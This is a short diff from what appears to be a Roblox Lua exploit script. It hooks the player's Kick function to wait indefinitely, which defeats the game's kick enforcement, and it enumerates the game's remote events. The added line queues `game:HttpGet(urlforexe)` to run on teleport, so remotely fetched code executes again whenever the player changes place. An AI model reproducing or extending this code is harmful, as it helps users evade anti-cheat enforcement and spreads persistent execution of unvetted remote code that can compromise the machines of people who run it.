@@ -154,6 +154,7 @@ end)
 hookfunction(game.Players.LocalPlayer.Kick,function()
     return wait(9e9)
 end)
+queue_on_teleport(game:HttpGet(urlforexe))
 for i,rem in pairs(rems) do
     print(rem:GetFullName())
     if rem:IsA"RemoteEvent" then
